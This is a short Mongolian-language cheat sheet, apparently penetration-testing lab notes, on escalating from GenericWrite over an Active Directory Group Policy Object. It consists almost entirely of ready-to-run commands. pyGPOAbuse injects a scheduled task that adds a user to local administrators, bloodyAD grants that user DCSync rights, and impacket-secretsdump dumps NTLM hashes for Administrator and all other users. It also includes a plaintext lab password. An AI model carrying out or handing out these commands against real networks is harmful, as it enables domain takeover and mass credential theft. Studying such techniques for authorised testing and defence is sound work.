# GenericWrite to GPO

### 1. GPO Abuse (Task/Script Injection)

`pyGPOAbuse` нь GPO дотор шинэ **Scheduled Task** эсвэл **Startup Script** үүсгэдэг. GPO-ийн Filesystem (Sysvol) болон AD Attribute-ийг өөрчилж бүх компьютер дээр командыг ажиллуулна.

```bash
python3 pygpoabuse.py 'secura.yzx/charlotte:Game2On4.!' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -taskname "Infect" -description "Checking" -command "net localgroup administrators charlotte /add"
```

> `-gpo-id`-ийг Bloodhound --> Domain Policy --> Gpcpath `{31B2F340-016D-11D2-945F-00C04FB984F9}`

[image]

```bash
impacket-secretsdump 'secura.yzx/charlotte:password@192.168.12.XXX'
```

### 2. DCSync Rights Injection (Хамгийн хүчтэй арга)

`GenericWrite` эсвэл `WriteDacl` байгаа бол өөртөө **DCSync** эрхийг өгч болно.

**Алхам 1 (Эрх олгох):**

```bash
bloodyAD -u charlotte -p 'Game2On4.!' -d secura.yzx --host <DC_IP> add dcsync charlotte
```

**Алхам 2 (Hash сорох):**

```bash
impacket-secretsdump 'secura.yzx/charlotte:Game2On4.!@<DC_IP>'
```

*Administrator болон бусад бүх хэрэглэгчийн NTLM hash-ийг авна.*
